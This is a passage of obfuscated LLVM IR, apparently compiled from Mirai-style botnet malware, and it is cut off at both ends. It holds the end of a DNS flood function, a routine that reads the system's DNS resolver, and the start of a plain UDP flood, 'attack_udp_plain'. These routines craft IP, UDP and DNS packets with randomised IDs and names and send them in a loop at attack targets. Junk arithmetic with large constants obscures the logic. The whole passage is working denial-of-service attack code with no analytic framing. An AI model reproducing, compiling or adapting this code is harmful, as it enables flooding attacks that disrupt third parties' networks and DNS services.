  %299 = load i8, i8* %27, align 1
  %300 = load i8*, i8** %33, align 8
  store i8 %299, i8* %300, align 1
  store i8 0, i8* %27, align 1
  %301 = load i8, i8* %28, align 1
  %302 = sub i8 %301, 61
  %303 = add i8 %302, 1
  %304 = add i8 %303, 61
  %305 = add i8 %301, 1
  store i8 %304, i8* %28, align 1
  %306 = load i8*, i8** %32, align 8
  %307 = load i32, i32* %26, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds i8, i8* %306, i64 %308
  %310 = getelementptr inbounds i8, i8* %309, i64 1
  store i8* %310, i8** %33, align 8
  br label %316

; <label>:311:                                    ; preds = %290
  %312 = load i8, i8* %27, align 1
  %313 = sub i8 0, 1
  %314 = sub i8 %312, %313
  %315 = add i8 %312, 1
  store i8 %314, i8* %27, align 1
  br label %316

; <label>:316:                                    ; preds = %311, %298
  br label %317

; <label>:317:                                    ; preds = %316
  %318 = load i32, i32* %26, align 4
  %319 = sub i32 0, 1
  %320 = sub i32 %318, %319
  %321 = add nsw i32 %318, 1
  store i32 %320, i32* %26, align 4
  br label %286

; <label>:322:                                    ; preds = %286
  %323 = load i8, i8* %27, align 1
  %324 = load i8*, i8** %33, align 8
  store i8 %323, i8* %324, align 1
  %325 = load i8*, i8** %32, align 8
  %326 = load i32, i32* %23, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds i8, i8* %325, i64 %327
  %329 = getelementptr inbounds i8, i8* %328, i64 2
  %330 = bitcast i8* %329 to %struct.grehdr*
  store %struct.grehdr* %330, %struct.grehdr** %34, align 8
  %331 = call zeroext i16 @htons(i16 zeroext 1) #7
  %332 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %333 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %332, i32 0, i32 0
  store i16 %331, i16* %333, align 2
  %334 = call zeroext i16 @htons(i16 zeroext 1) #7
  %335 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %336 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %335, i32 0, i32 1
  store i16 %334, i16* %336, align 2
  br label %337

; <label>:337:                                    ; preds = %322
  %338 = load i32, i32* %11, align 4
  %339 = sub i32 0, %338
  %340 = sub i32 0, 1
  %341 = add i32 %339, %340
  %342 = sub i32 0, %341
  %343 = add nsw i32 %338, 1
  store i32 %342, i32* %11, align 4
  br label %107

; <label>:344:                                    ; preds = %107
  br label %345

; <label>:345:                                    ; preds = %539, %344
  store i32 0, i32* %11, align 4
  br label %346

; <label>:346:                                    ; preds = %526, %345
  %347 = load i32, i32* %11, align 4
  %348 = load i8, i8* %7, align 1
  %349 = zext i8 %348 to i32
  %350 = icmp slt i32 %347, %349
  br i1 %350, label %351, label %533

; <label>:351:                                    ; preds = %346
  %352 = load i8**, i8*** %13, align 8
  %353 = load i32, i32* %11, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds i8*, i8** %352, i64 %354
  %356 = load i8*, i8** %355, align 8
  store i8* %356, i8** %35, align 8
  %357 = load i8*, i8** %35, align 8
  %358 = bitcast i8* %357 to %struct.iphdr*
  store %struct.iphdr* %358, %struct.iphdr** %36, align 8
  %359 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %360 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %359, i64 1
  %361 = bitcast %struct.iphdr* %360 to %struct.udphdr*
  store %struct.udphdr* %361, %struct.udphdr** %37, align 8
  %362 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %363 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %362, i64 1
  %364 = bitcast %struct.udphdr* %363 to %struct.dnshdr*
  store %struct.dnshdr* %364, %struct.dnshdr** %38, align 8
  %365 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %366 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %365, i64 1
  %367 = bitcast %struct.dnshdr* %366 to i8*
  %368 = getelementptr inbounds i8, i8* %367, i64 1
  store i8* %368, i8** %39, align 8
  %369 = load i16, i16* %15, align 2
  %370 = zext i16 %369 to i32
  %371 = icmp eq i32 %370, 65535
  br i1 %371, label %372, label %381

; <label>:372:                                    ; preds = %351
  %373 = call i32 @rand_next()
  %374 = xor i32 65535, -1
  %375 = xor i32 %373, %374
  %376 = and i32 %375, %373
  %377 = and i32 %373, 65535
  %378 = trunc i32 %376 to i16
  %379 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i32 0, i32 3
  store i16 %378, i16* %380, align 4
  br label %381

; <label>:381:                                    ; preds = %372, %351
  %382 = load i16, i16* %18, align 2
  %383 = zext i16 %382 to i32
  %384 = icmp eq i32 %383, 65535
  br i1 %384, label %385, label %394

; <label>:385:                                    ; preds = %381
  %386 = call i32 @rand_next()
  %387 = xor i32 65535, -1
  %388 = xor i32 %386, %387
  %389 = and i32 %388, %386
  %390 = and i32 %386, 65535
  %391 = trunc i32 %389 to i16
  %392 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %393 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %392, i32 0, i32 0
  store i16 %391, i16* %393, align 2
  br label %394

; <label>:394:                                    ; preds = %385, %381
  %395 = load i16, i16* %19, align 2
  %396 = zext i16 %395 to i32
  %397 = icmp eq i32 %396, 65535
  br i1 %397, label %398, label %411

; <label>:398:                                    ; preds = %394
  %399 = call i32 @rand_next()
  %400 = xor i32 %399, -1
  %401 = xor i32 65535, -1
  %402 = xor i32 -974350347, -1
  %403 = or i32 %400, %401
  %404 = or i32 -974350347, %402
  %405 = xor i32 %403, -1
  %406 = and i32 %405, %404
  %407 = and i32 %399, 65535
  %408 = trunc i32 %406 to i16
  %409 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %410 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %409, i32 0, i32 1
  store i16 %408, i16* %410, align 2
  br label %411

; <label>:411:                                    ; preds = %398, %394
  %412 = load i16, i16* %20, align 2
  %413 = zext i16 %412 to i32
  %414 = icmp eq i32 %413, 65535
  br i1 %414, label %415, label %428

; <label>:415:                                    ; preds = %411
  %416 = call i32 @rand_next()
  %417 = xor i32 %416, -1
  %418 = xor i32 65535, -1
  %419 = xor i32 1954976268, -1
  %420 = or i32 %417, %418
  %421 = or i32 1954976268, %419
  %422 = xor i32 %420, -1
  %423 = and i32 %422, %421
  %424 = and i32 %416, 65535
  %425 = trunc i32 %423 to i16
  %426 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %427 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %426, i32 0, i32 0
  store i16 %425, i16* %427, align 2
  br label %428

; <label>:428:                                    ; preds = %415, %411
  %429 = load i8*, i8** %39, align 8
  %430 = load i8, i8* %21, align 1
  %431 = zext i8 %430 to i32
  call void @rand_alpha_str(i8* %429, i32 %431)
  %432 = load i8*, i8** %39, align 8
  %433 = load i8, i8* %21, align 1
  %434 = zext i8 %433 to i64
  %435 = getelementptr inbounds i8, i8* %432, i64 %434
  store i8 0, i8* %435, align 1
  %436 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 7
  store i16 0, i16* %437, align 2
  %438 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %439 = bitcast %struct.iphdr* %438 to i16*
  %440 = call zeroext i16 @checksum_generic(i16* %439, i32 20)
  %441 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %442 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %441, i32 0, i32 7
  store i16 %440, i16* %442, align 2
  %443 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %444 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %443, i32 0, i32 3
  store i16 0, i16* %444, align 2
  %445 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %446 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %447 = bitcast %struct.udphdr* %446 to i8*
  %448 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %449 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %448, i32 0, i32 2
  %450 = load i16, i16* %449, align 2
  %451 = load i8, i8* %21, align 1
  %452 = zext i8 %451 to i64
  %453 = add i64 21, -1518603683894841644
  %454 = add i64 %453, %452
  %455 = sub i64 %454, -1518603683894841644
  %456 = add i64 21, %452
  %457 = sub i64 0, %455
  %458 = sub i64 0, 2
  %459 = add i64 %457, %458
  %460 = sub i64 0, %459
  %461 = add i64 %455, 2
  %462 = load i32, i32* %23, align 4
  %463 = sext i32 %462 to i64
  %464 = add i64 %460, -8904614746124913770
  %465 = add i64 %464, %463
  %466 = sub i64 %465, -8904614746124913770
  %467 = add i64 %460, %463
  %468 = sub i64 %466, 8360303540015118368
  %469 = add i64 %468, 4
  %470 = add i64 %469, 8360303540015118368
  %471 = add i64 %466, 4
  %472 = trunc i64 %470 to i32
  %473 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %445, i8* %447, i16 zeroext %450, i32 %472)
  %474 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %475 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %474, i32 0, i32 3
  store i16 %473, i16* %475, align 2
  %476 = load i32, i32* %24, align 4
  %477 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %478 = load i32, i32* %11, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %477, i64 %479
  %481 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %480, i32 0, i32 0
  %482 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %481, i32 0, i32 2
  %483 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %482, i32 0, i32 0
  store i32 %476, i32* %483, align 4
  %484 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %485 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %484, i32 0, i32 1
  %486 = load i16, i16* %485, align 2
  %487 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %488 = load i32, i32* %11, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i64 %489
  %491 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %490, i32 0, i32 0
  %492 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %491, i32 0, i32 1
  store i16 %486, i16* %492, align 2
  %493 = load i32, i32* %12, align 4
  %494 = load i8*, i8** %35, align 8
  %495 = load i8, i8* %21, align 1
  %496 = zext i8 %495 to i64
  %497 = sub i64 41, -6343097351052015223
  %498 = add i64 %497, %496
  %499 = add i64 %498, -6343097351052015223
  %500 = add i64 41, %496
  %501 = sub i64 0, %499
  %502 = sub i64 0, 2
  %503 = add i64 %501, %502
  %504 = sub i64 0, %503
  %505 = add i64 %499, 2
  %506 = load i32, i32* %23, align 4
  %507 = sext i32 %506 to i64
  %508 = sub i64 %504, 4592561236977064719
  %509 = add i64 %508, %507
  %510 = add i64 %509, 4592561236977064719
  %511 = add i64 %504, %507
  %512 = add i64 %510, 5117386948160702814
  %513 = add i64 %512, 4
  %514 = sub i64 %513, 5117386948160702814
  %515 = add i64 %510, 4
  %516 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %517 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %518 = load i32, i32* %11, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %517, i64 %519
  %521 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %520, i32 0, i32 0
  %522 = bitcast %struct.sockaddr_in* %521 to %struct.sockaddr*
  store %struct.sockaddr* %522, %struct.sockaddr** %516, align 8
  %523 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %524 = load %struct.sockaddr*, %struct.sockaddr** %523, align 8
  %525 = call i64 @sendto(i32 %493, i8* %494, i64 %514, i32 16384, %struct.sockaddr* %524, i32 16)
  br label %526

; <label>:526:                                    ; preds = %428
  %527 = load i32, i32* %11, align 4
  %528 = sub i32 0, %527
  %529 = sub i32 0, 1
  %530 = add i32 %528, %529
  %531 = sub i32 0, %530
  %532 = add nsw i32 %527, 1
  store i32 %531, i32* %11, align 4
  br label %346

; <label>:533:                                    ; preds = %346
  %534 = call i64 @time(i64* null) #6
  %535 = load i32, i32* %25, align 4
  %536 = sext i32 %535 to i64
  %537 = icmp sgt i64 %534, %536
  br i1 %537, label %538, label %539

; <label>:538:                                    ; preds = %533
  br label %540

; <label>:539:                                    ; preds = %533
  br label %345

; <label>:540:                                    ; preds = %538, %103, %97, %91
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %11 = call i8* @table_retrieve_val(i32 37, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 37)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 38)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 38, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %105

; <label>:28:                                     ; preds = %15
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %92, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %98

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %92

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %72, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %72, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub i32 %66, -92343822
  %68 = sub i32 %67, 1
  %69 = add i32 %68, -92343822
  %70 = sub nsw i32 %66, 1
  %71 = icmp eq i32 %65, %69
  br i1 %71, label %72, label %91

; <label>:72:                                     ; preds = %64, %60, %56
  %73 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %74 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %75 = load i32, i32* %4, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 0, %79
  %81 = add i32 %78, %80
  %82 = sub nsw i32 %78, %79
  call void @util_memcpy(i8* %73, i8* %77, i32 %81)
  %83 = load i32, i32* %6, align 4
  %84 = load i32, i32* %4, align 4
  %85 = sub i32 %83, -832047063
  %86 = sub i32 %85, %84
  %87 = add i32 %86, -832047063
  %88 = sub nsw i32 %83, %84
  %89 = sext i32 %87 to i64
  %90 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %89
  store i8 0, i8* %90, align 1
  store i8 1, i8* %9, align 1
  br label %98

; <label>:91:                                     ; preds = %64
  br label %92

; <label>:92:                                     ; preds = %91, %49
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 %93, -623307012
  %95 = add i32 %94, 1
  %96 = add i32 %95, -623307012
  %97 = add nsw i32 %93, 1
  store i32 %96, i32* %6, align 4
  br label %30

; <label>:98:                                     ; preds = %72, %30
  %99 = load i8, i8* %9, align 1
  %100 = icmp ne i8 %99, 0
  br i1 %100, label %101, label %104

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  br label %117

; <label>:104:                                    ; preds = %98
  br label %105

; <label>:105:                                    ; preds = %104, %15
  br label %106

; <label>:106:                                    ; preds = %105, %0
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  switch i32 %108, label %117 [
    i32 0, label %109
    i32 1, label %111
    i32 2, label %113
    i32 3, label %115
  ]

; <label>:109:                                    ; preds = %106
  %110 = call i32 @htonl(i32 134744072) #7
  store i32 %110, i32* %1, align 4
  br label %117

; <label>:111:                                    ; preds = %106
  %112 = call i32 @htonl(i32 1246898730) #7
  store i32 %112, i32* %1, align 4
  br label %117

; <label>:113:                                    ; preds = %106
  %114 = call i32 @htonl(i32 1074151430) #7
  store i32 %114, i32* %1, align 4
  br label %117

; <label>:115:                                    ; preds = %106
  %116 = call i32 @htonl(i32 67240450) #7
  store i32 %116, i32* %1, align 4
  br label %117

; <label>:117:                                    ; preds = %115, %113, %111, %109, %106, %101
  %118 = load i32, i32* %1, align 4
  ret i32 %118
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add i64 %51, 6619738442344645475
  %55 = add i64 %54, %53
  %56 = sub i64 %55, 6619738442344645475
  %57 = add nsw i64 %51, %53
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %19, align 4
  %59 = load i16, i16* %15, align 2
  %60 = zext i16 %59 to i32
  %61 = icmp eq i32 %60, 65535
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %5
  %63 = call i32 @rand_next()
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %15, align 2
  br label %68

; <label>:65:                                     ; preds = %5
  %66 = load i16, i16* %15, align 2
  %67 = call zeroext i16 @htons(i16 zeroext %66) #7
  store i16 %67, i16* %15, align 2
  br label %68

; <label>:68:                                     ; preds = %65, %62
  store i32 0, i32* %11, align 4
  br label %69

; <label>:69:                                     ; preds = %184, %68
  %70 = load i32, i32* %11, align 4
  %71 = load i8, i8* %7, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %70, %72
  br i1 %73, label %74, label %190

; <label>:74:                                     ; preds = %69
  %75 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %76 = load i8**, i8*** %12, align 8
  %77 = load i32, i32* %11, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8*, i8** %76, i64 %78
  store i8* %75, i8** %79, align 8
  %80 = load i16, i16* %14, align 2
  %81 = zext i16 %80 to i32
  %82 = icmp eq i32 %81, 65535
  br i1 %82, label %83, label %92

; <label>:83:                                     ; preds = %74
  %84 = call i32 @rand_next()
  %85 = trunc i32 %84 to i16
  %86 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 0
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %90, i32 0, i32 1
  store i16 %85, i16* %91, align 2
  br label %101

; <label>:92:                                     ; preds = %74
  %93 = load i16, i16* %14, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %93) #7
  %95 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %96 = load i32, i32* %11, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 1
  store i16 %94, i16* %100, align 2
  br label %101

; <label>:101:                                    ; preds = %92, %83
  %102 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %103 = load i32*, i32** %13, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i32, i32* %103, i64 %105
  store i32 %102, i32* %106, align 4
  %107 = icmp eq i32 %102, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %101
  br label %235

; <label>:109:                                    ; preds = %101
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %110, align 4
  %111 = load i16, i16* %15, align 2
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %111, i16* %112, align 2
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %114 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %113, i32 0, i32 0
  store i32 0, i32* %114, align 4
  %115 = load i32*, i32** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %115, i64 %117
  %119 = load i32, i32* %118, align 4
  %120 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %121 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %121, %struct.sockaddr** %120, align 8
  %122 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %123 = load %struct.sockaddr*, %struct.sockaddr** %122, align 8
  %124 = call i32 @bind(i32 %119, %struct.sockaddr* %123, i32 16) #6
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %127

; <label>:126:                                    ; preds = %109
  br label %127

; <label>:127:                                    ; preds = %126, %109
  %128 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %129 = load i32, i32* %11, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %128, i64 %130
  %132 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %131, i32 0, i32 2
  %133 = load i8, i8* %132, align 4
  %134 = zext i8 %133 to i32
  %135 = icmp slt i32 %134, 32
  br i1 %135, label %136, label %165

; <label>:136:                                    ; preds = %127
  %137 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %138 = load i32, i32* %11, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i64 %139
  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i32 0, i32 1
  %142 = load i32, i32* %141, align 4
  %143 = call i32 @ntohl(i32 %142) #7
  %144 = call i32 @rand_next()
  %145 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %146 = load i32, i32* %11, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i64 %147
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i32 0, i32 2
  %150 = load i8, i8* %149, align 4
  %151 = zext i8 %150 to i32
  %152 = lshr i32 %144, %151
  %153 = add i32 %143, 1689928067
  %154 = add i32 %153, %152
  %155 = sub i32 %154, 1689928067
  %156 = add i32 %143, %152
  %157 = call i32 @htonl(i32 %155) #7
  %158 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %159 = load i32, i32* %11, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %162, i32 0, i32 2
  %164 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %163, i32 0, i32 0
  store i32 %157, i32* %164, align 4
  br label %165

; <label>:165:                                    ; preds = %136, %127
  %166 = load i32*, i32** %13, align 8
  %167 = load i32, i32* %11, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i32, i32* %166, i64 %168
  %170 = load i32, i32* %169, align 4
  %171 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %172 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 0
  %177 = bitcast %struct.sockaddr_in* %176 to %struct.sockaddr*
  store %struct.sockaddr* %177, %struct.sockaddr** %171, align 8
